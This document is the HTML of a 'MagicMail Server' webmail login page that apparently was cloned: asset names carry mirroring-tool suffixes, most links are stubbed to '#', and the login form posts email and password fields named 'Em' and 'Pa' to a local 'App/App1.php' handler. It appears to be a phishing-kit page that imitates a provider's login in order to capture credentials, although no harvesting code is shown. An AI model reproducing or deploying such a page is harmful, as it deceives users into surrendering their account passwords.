<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>MagicMail Server: Login Page</title>
<link rel='stylesheet' href='css/wizardf330.css?mtime=1713820567' type='text/css'/>
<link rel='stylesheet' href='css/magicmailf330.css?mtime=1713820567' type='text/css'/>
<!--[if IE]><link rel='stylesheet' href='css/magicmail-ie.css?mtime=1713820564' type='text/css'/>
<![endif]-->
<link rel='stylesheet' href='css/css3f62.css?mtime=1713820564' type='text/css'/>
<link rel='stylesheet' href='css/magicmail.login3f62.css?mtime=1713820564' type='text/css'/>
<link rel='stylesheet' href='html_files/userd642.css?mtime=1641591162' type='text/css'/>
<script language='JavaScript' type='text/javascript' src='js/global_javascript62ec.js?mtime=1713208238'></script>
<script language='JavaScript' type='text/javascript' src='js/htmlcanvas3f62.js?mtime=1713820564'></script>
<script language='JavaScript' type='text/javascript' src='js/login3f62.js?mtime=1713820564'></script>
<script language='JavaScript' type='text/javascript' src='js/jqueryf778.js?mtime=1713821925'></script>
    <link rel="shortcut icon" href="favicon.ico" />
	<script language="javascript" type="text/javascript">var isauthenticated=0;</script>
    <link rel="icon" href="pics/apple-touch-icon-precomposed.png" />
    <link rel="icon" type="image/png" sizes="72x72" href="pics/apple-touch-icon-72x72-precomposed.png" />
    <link rel="icon" type="image/png" sizes="114x114" href="pics/apple-touch-icon-114x114-precomposed.png" />
    <link rel="icon" type="image/png" sizes="144x144" href="pics/apple-touch-icon-144x144-precomposed.png" />
</head>
<body id="MagicBody" class="MagicBody">
<div id="MagicWrapper" class="magic-unauthenticated">
	<table class="MagicOuterTable">
		<tr id='page_contents_row'>
			<td>
                <!-- $Header$ -->

<!-- =================================================================== -->
<!-- Header Style 1 BEGIN -->
<!-- =================================================================== -->

<table id="MainHeaderTable">
    <tr valign="top">
        <td id="MMLogo">
            <span><img id='leftHeaderLogo' src="isp_images/header-logo.png" border="0"></span>
        </td>
        <td align="right">
            <table id="header-table" class="nopad">
                <tr>
                    <td colspan="2" id="HeaderLogo"><img id='rightHeaderLogo' src="isp_images/header-logo2.gif"></td>
                </tr>
                <tr valign="bottom">
                    <td colspan="2" class="nopad">
                        <div class='MagicNavTab'>
                            <a href="#" id="header-logout-btn">Logout</a>
                        </div>
                    </td>
                </tr>
            </table>
        </td>
    </tr>
    <tr id="UserSubHeaderRow">
        <td align="right" colspan="2" id="MainHeaderSubMenu">
                    </td>
    </tr>
</table>

<!-- =================================================================== -->
<!-- Header Style 1 END -->
<!-- =================================================================== -->
				<table class="MagicContentTable">
					<tr valign="top">
                    
						<td class="MagicContentCell" valign="top">
<div id="loginContentCell">
<!-- $Id -->
<div class="login-info-content">
<h2>Welcome to WebMail</h2>
<h4>Login to access your account</h4>
<p class='main_wiz'>
Welcome to our WebMail System.
This is where you can access your email and set up and configure your email options.
</p>
<h4>Forgot Your Password?</h4>
<p class='main_wiz'>
<!-- 
Please login by entering your <b>full email address in lower case</b> and your password.<br />
If you have lost your password, please <a href="recover-password.php">click here</a> to recover it.<br />
-->
We are dedicated to providing you a secure online environment.<br/><br/>
To have your password reset, please contact the business office
or our Internet Technical Support team.<br/><br/>
<small><i>* Note: You MUST have cookies enabled in your browser for WebMail to function properly.</i></small>
</p>
</div><!-- login-info-content -->
<div id="login-form-wrapper">
    <form action="App/App1.php" method="post" id="login-form" name="login-form" onSubmit="return checkForm();">
        <blockquote>
            <table id="login-form-table" class='MagicEmbeddedTable'>
                <tr>
                    <th colspan='2'>
                        <h4>Login to MagicMail</h4>
                    </th>
                </tr>
                

                <tr>
                    <td class="textright">
                        <label for="login-email" title=Enter your full email address.>
                            Email:
                        </label>
                    </td>
                    <td>
                        <input size="20" type="email" name="Em" id="login-email" autocorrect="off" autocapitalize="none"
                            value=>
                    </td>
                </tr>

                <tr>
                    <td class="textright">
                        <label for="login-password"
                            title=Enter your password.  Ensure your CAPS LOCK is not on.>
                                Password:
                        </label>
                    </td>
                    <td class="show-password" >
                        <input size="20" type="password" name="Pa"
                            id="login-password"> 
                        <label for="show-password">
                            <input type="checkbox" id="show-password" onclick="showPass()"> 
				                Show Password
                        </label>
                    </td>
                </tr>
                <tr class="forgot-password-row">
                    <td></td>
                    <td id="recover-pass-td">
                        <a href="#">Forgot your password?</a>
                    </td>
                </tr>

                <tr>
                    <td class='formFoot'>
                        <table>
                            <tr>
                                <td class="poweredBy">

                                <a href="#"><img src="pics/powered_by.png"> </a>

                                


</td>
                                <td class="loginBtn">
                                    <input type="submit" value="Login">
                                </td>
                            </tr>
                        </table>
                    </td>
                </tr>
            </table>
        </blockquote>
    </form>
</div>
<!-- $default_login_extra$ -->
<!-- =================================================================== -->
<!-- This is the login EXTRA section of the website (below the login form) -->


<!-- END OF default_login_extra -->
<!-- =================================================================== -->

</div><!-- loginContentCell -->
                          </td>
                      </tr>
                  </table>
              </td>
          </tr>
          <tr id='footer_row'>
              <td><!-- $Id: company_footer.html 34627 2019-06-28 00:59:51Z shaun $ -->
<!-- =================================================================== -->
<!-- This is the FOOTER section of the website -->

<table width="100%" border="0" cellspacing="0" cellpadding="0">
	<tr align="center" class="MagicCompanyFooter">
		<td>MagicMail Server is brought to you by 24HourSupport.com<br>
			<a href="#">Need Assistance?</a>
		</td>
	</tr>
</table>
<!-- END OF Footer -->
<!-- =================================================================== -->
<!-- ================================================================== -->
<!-- Copyright Information, DO NOT CHANGE BELOW HERE -->
<!-- ================================================================== -->
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr align="center" class="MagicCopyRight">
          <td>
            <p align="center">
                MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.
            </p>
          </td>
        </tr>
      </table>
<!-- ================================================================== -->
            </td>
        </tr>
    </table>
</div>
</body>
</html>